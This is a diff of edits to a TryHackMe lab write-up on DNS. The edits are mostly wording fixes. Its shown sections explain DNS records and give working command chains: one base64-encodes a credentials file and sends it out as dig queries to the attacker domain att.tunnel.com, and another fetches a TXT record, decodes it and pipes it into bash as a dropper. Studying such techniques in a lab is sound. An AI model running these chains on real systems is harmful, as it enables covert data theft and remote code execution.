@@ -462,7 +462,7 @@ The domain name consists of three parts. For instance, for `www.example.com`:
 
 ![Domain name structure](domain-name-structure.png){: width="70%"}
 
-**DNS records** are essential components of the DNS infrastructure that provide information about **how domain names should be resolved** to their corresponding IP addresses or other types of data. There are variosu DNS record types and each one serves a specific purpose. We will explain just 3 of them, the ones that we will be using for this task:
+**DNS records** are essential components of the DNS infrastructure that provide information about **how domain names should be resolved** to their corresponding IP addresses or other types of data. There are various DNS record types and each one serves a specific purpose. We will explain just the three that we will be using for this task:
 - `A` The **Address** record maps a domain name to an IPv4 address. 
 - `NS` The **Name Server** record specifies the authoritative name servers for a domain. These are responsible for providing DNS information about the domain.
 - `TXT` The **Text** record can store any text data and is can be used for various purposes.
@@ -506,21 +506,21 @@ thm@jump-box:~$ ping test.thm.com -c 1
 ```
 
 The `dig` command works as follows:
-- `dig` Stands for **Domain Information Groper** and is used for performing DNS lookups, i.e., querying DNS nameservers to obtain information about domain names, IP addresses, and other DNS-related data.
+- `dig` Stands for **Domain Information Groper** and it is used for performing DNS lookups, i.e., querying DNS nameservers to obtain information about domain names, IP addresses, and other DNS-related data.
 - `+short` This is used to request a more concise output.
 - `test.thm.com` The domain name for which we want to perofrm a DNS query.
 
-We can also answer the room's question by resolving `flag.thm.com`:
+We can answer the room's question by resolving `flag.thm.com`:
 
 ![DNS Flag1](dns-flag1.png)
 
 ### 7.2 DNS Manual Data Exfiltration
 
-DNS's primary purpose it to **resolve domain names to IP addresses** and vice versa. Since DNS is not a transport protocol, **DNS traffic is not regurarly monitored**, and, in addition, most company **firewalls will allow DNS traffic** to pass through. 
+As we already know, DNS's primary purpose it to **resolve domain names to IP addresses** and vice versa. The pros of using DNS for Data Exfil is that because it is not a transport protocol, **DNS traffic is not regurarly monitored**, and, in addition, most company **firewalls will allow DNS traffic** to pass through. 
 
-Although the above might seem ideal, DNS has also some limitations:
+Nevertheless, DNS has also some limitations:
 1. The maximum length of the **Fully Qualified Domain Name (FQDN)** is 255 characters.
-2. The maximum length of the **subdomain name**, aka label, is 63 characters.
+2. The maximum length of the **subdomain name** is 63 characters.
 
 ![DNS Limitations](https://tryhackme-images.s3.amazonaws.com/user-uploads/5d617515c8cd8348d0b4e68f/room-content/8bbc858294e45de16712024af22181fc.png)
 
@@ -528,7 +528,7 @@ Based on the above, **we can use a limited number of characters to transfer data
 
 The steps to perform DNS Data Exfiltration are:
 1. The attacker registers a domain name. We already have `tunnel.com`. 
-2. The attacker sets up the domain name's DNS record points to a server under his control. We will use the `att.tunnel.com`.
+2. The attacker sets up the domain name's DNS record points to a server under his control. We already have `A` and `NS` DNS records set up.
 3. The attacker sends sensitive data from a target to a domain name under his control, e.g. `passw0rd.tunnel.com`, where `passw0rd` is the data the needs to be exfiltrated.
 4. The DNS request is sent through the local DNS server and is forwarded through the internet.
 5. The attacker's authoritative DNS receives the DNS request. 
@@ -536,7 +536,7 @@ The steps to perform DNS Data Exfiltration are:
 
 ![DNS Data Exfil Process](https://tryhackme-images.s3.amazonaws.com/user-uploads/5d617515c8cd8348d0b4e68f/room-content/9881e420044ca01239d34c858342b888.png)
 
-Let's assume that we have a filed called `creds.txt`, and we want to move it over DNS. We need to:
+Let's assume that we have a file named `creds.txt`, and we want to move it over DNS. We need to:
 1. Get the required data that needs to be exfiltrated.
 2. Encode the data.
 3. Send the encoded data as a subdomain, keeping in mind the DNS length limitations. If we exceed those limits, the data will be split, and more DNS requests will be sent.
@@ -594,8 +594,8 @@ Our goal for this task is transferring the content of the `credit.txt` file from
     1. `cat task9/credit.txt` Display the contents of the `credit.txt` file located in the `task9` directory.
     2. `base64` We also used **base64 encoding** on the HTTP section.
     3. `tr -d "\n"` The `tr` command is used for translating or deleting characters. In this case, we use it to remove newline characters, `\n` from the output. Newline characters are typically used to separate lines of text, so with this, we essentially remove line breaks.
-    4. `fold -w18` The `fold` command is used to wrap text to a specified width, in this case, it wraps the text into line of 18 characters each. This helps format the data info fixed-width lines.
-    5. `sed -r 's/.*/&.att.tunnel.com/'` We have seen the stream editor before as well. We now use with regular expressions, aka **regex**, to modify each line of the input text:
+    4. `fold -w18` The `fold` command is used to wrap text to a specified width, in this case, it wraps the text into lines of 18 characters each. This helps format the data info fixed-width lines.
+    5. `sed -r 's/.*/&.att.tunnel.com/'` We have seen the stream editor before as well. We now use it with [regular expressions](https://www.w3schools.com/js/js_regexp.asp), aka **regex**, to modify each line of the input text:
         - `-r` This tells `sed` to used extended regex.
         - `s/.*/&.att.tunnel.com/'` This is a regex substitution. It takes each line (`.*` matches the entire line), and appends `.att.tunnel.com` to it.  
 
@@ -606,7 +606,7 @@ Our goal for this task is transferring the content of the `credit.txt` file from
     ```
 
     This command is similar to the above with a few changes:
-    - `cat task9/credit.txt | base64 | tr -d "\n" | fold -w18` This part is identical. So by know, we have encoded the data, removed line breaks, and grouped it in lines of 18 characters each.
+    - `cat task9/credit.txt | base64 | tr -d "\n" | fold -w18` This part is identical. So by now, we have encoded the data, removed line breaks, and grouped it in lines of 18 characters each.
     - `sed 's/.*/&./'` We append a period, `.`, to the end of each line.
     - `tr -d "\n"` After we grouped the data in fixed-width lines, and appended a dot at the end of each, we now remove once again the line breaks. This will result having a single line of data.
     - `sed s/$/att.tunnel.com/` This appends `att.tunnel.com` on the line. The regex `s/$` matches the end of the line, and it is replaced with `att.tunnel.com`.
@@ -620,15 +620,21 @@ Our goal for this task is transferring the content of the `credit.txt` file from
     ```
 
     We added two things at the end of the command:
-    - `awk '{print "dig +short " $1}'` The `awk` command is used to process text data. In this case, it takes each line of text and prints a `dig +short` command followed by the text from the line, effectively creating a series of `dig` commands. 
-    - `bash` This executes the `dig` commands generated by `awk` through the Bash shell.
+    - `awk '{print "dig +short " $1}'` The `awk` command is used to process text data. In this case, it takes the single line of text and prints a `dig +short` command followed by the text from the line, effectively creating a `dig` command. 
+    - `bash` This executes the `dig` command generated by `awk` through the Bash shell.
+
+    We can see how the output has changed by adding the `awk` command:
+    
+    ![awk-command](awk-command.jpg)
+
+    We can also see the full process, including the received DNS request:
 
     ![DNS Data Exfil](dns-data-transfer.png)
 
 5. Once our DNS request is received, we can stop `tcpdump`, clean, and decode the received data:
 
     ```shell
-    thm@attacker:~$ echo "TmFtZTogVEhNLXVzZX.IKQWRkcmVzczogMTIz.NCBJbnRlcm5ldCwgVE.hNCkNyZWRpdCBDYXJk.OiAxMjM0LTEyMzQtMT.IzNC0xMjM0CkV4cGly.ZTogMDUvMDUvMjAyMg.pDb2RlOiAxMzM3Cg==.att.tunnel.com." | cut -d"." -f1-8 | tr -d "." | base64 -d
+    thm@attacker:~$ echo "TmFtZTogVEhNLXVzZX.IKQWRkcmVzczogMTIz.NCBJbnRlcm5ldCwgVE.hNCkNyZWRpdCBDYXJk.OiAxMjM0LTEyMzQtMT.IzNC0xMjM0CkV4cGly.ZTogMDUvMDUvMjAyMg.pDb2RlOiAxMzM3Cg==.att.tunnel.com." | cut -d "." -f1-8 | tr -d "." | base64 -d
     # Name: THM-user
     # Address: 1234 Internet, THM
     # Credit Card: 1234-1234-1234-1234
@@ -637,13 +643,13 @@ Our goal for this task is transferring the content of the `credit.txt` file from
     ```
 
     The above command echoes the given string and then:
-    1. `cut -d"." -f1-8` Splits the string into fields using `.` as the delimiter, and then selects fields 1 through 8.
+    1. `cut -d "." -f1-8` Splits the string into fields using `.` as the delimiter, and then selects fields 1 through 8.
     2. `tr -d "."` Removes all occurrences of the `.` character in the output generated by the `cut` command.
     3. `base64 -d` Decodes the final result from Base64 to its original form.
 
 ### 7.3 C2 Communications over DNS
 
-Command and Control (C2) frameworks use the **TXT DNS record** to run a **dropper** for downnloading extra files on a target. This section simulates how to execute a bash script over DNS. 
+Command and Control (C2) frameworks use the **TXT DNS record** to run a [**dropper**](https://encyclopedia.kaspersky.com/glossary/trojan-droppers/) for downloading extra files on a target. This section simulates how to execute a bash script, our dropper for this task, over DNS. 
 
 Let's say we have the following bash script which simply sends one ICMP echo request packet to `test.thm.com`.:
 
@@ -676,7 +682,7 @@ ping -c 1 test.thm.com
     ```shell
     thm@victim2$ dig +short -t TXT script.tunnel.com | tr -d "\"" | base64 -d | bash
     ```
-    As we know by know, the above command:
+    As we know by now, the above command:
     1. Makes a DNS lookup for a TXT record for the domain `script.tunnel.com`.
     2. Removes double quotes, `"`, from the output.
     3. Decodes the base64 encoded text.
